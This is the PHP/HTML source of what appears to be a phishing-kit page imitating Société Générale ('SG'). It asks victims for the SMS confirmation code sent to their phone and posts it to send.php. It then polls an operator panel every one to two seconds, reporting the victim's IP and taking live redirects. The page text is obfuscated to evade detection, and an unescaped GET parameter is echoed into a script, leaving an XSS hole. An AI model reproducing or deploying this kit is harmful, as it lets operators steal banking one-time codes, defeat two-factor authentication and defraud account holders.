<?php 
require "../main.php";
?><!doctype html>
<html>
<head>
<title>SG | Vérification</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="res/jihanaid.css">
<link rel="stylesheet" href="res/auth.css">
<link rel="icon" href="res/icon.png">
</head>
<body>
<header>
<div class="row">
    <div class="col text-left p-5">
        <img src="res/logo.svg" style="width:180px;">
    </div>
</div>
</header>

<div class="container-full p-5">

<div class="form">
<h3><?php $obf->obf("Code de confirmation"); ?></h3>
<p><?php $obf->obf("Veuillez entrer le code envoyé à votre numéro de téléphone par SMS."); ?></p>
<?php if(isset($_GET['e'])){ ?>
<div class="form-col " style="color:red;">
Code invalide. Veuillez réessayer.
</div>
<?php } ?>
<div class="form-col sms">
    <label>Entrez le code</label>
    <input type="text" maxlength="6" class="textinput" style="text-transform:uppercase;" id="d0" placeholder="">
</div>

<div class="form-col">
    <button class="submitbtn" onclick="sendSms()" style="font-size:0.9em; width:100%;">Valider</button>
</div>

</div>

</div>


<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>

var allowSubmit=false;
 
$(".textinput").keypress((e)=>{
    if(e.key=="Enter"){
        sendSms();
    }
});


function sendSms(){
    if($("#d0").val()!=""){
        $(".submitbtn").css("background", "#fa596c");
        $(".submitbtn").attr("onclick", "return false;");
        $.post("send.php",{sms:$("#d0").val()},(d)=>{
           window.location="wait.php";
        });
    }
}

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>